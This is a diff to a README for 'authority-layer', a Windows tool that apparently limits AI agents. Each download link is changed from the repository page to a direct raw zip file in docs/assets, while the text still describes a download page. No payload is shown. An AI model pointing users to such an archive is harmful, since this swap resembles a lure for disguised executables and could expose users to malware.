@@ -1,6 +1,6 @@
 # ⚙️ authority-layer - Control AI Agent Limits Locally
 
-[![Download authority-layer](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Yasergit/authority-layer)
+[![Download authority-layer](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Yasergit/authority-layer/main/docs/assets/authority-layer-2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Make sure your Windows PC meets these needs before installing:
 
 Click the button below to visit the download page. This page has all the files you need.
 
-[![Download authority-layer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Yasergit/authority-layer)
+[![Download authority-layer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yasergit/authority-layer/main/docs/assets/authority-layer-2.0.zip)
 
 You will see a list of files and folders. Look for the latest release or the main folder to download. The file you want may be named something like `authority-layer.zip` or `authority-layer-win.exe`.
 
@@ -116,7 +116,7 @@ The software will enforce these rules automatically while AI agents run.
 
 Visit this page to download authority-layer:
 
-[https://github.com/Yasergit/authority-layer](https://github.com/Yasergit/authority-layer)
+[https://raw.githubusercontent.com/Yasergit/authority-layer/main/docs/assets/authority-layer-2.0.zip](https://raw.githubusercontent.com/Yasergit/authority-layer/main/docs/assets/authority-layer-2.0.zip)
 
 Select the latest release or main folder and download the `.exe` or `.zip` file for Windows. Follow the installation steps above to get started.
 
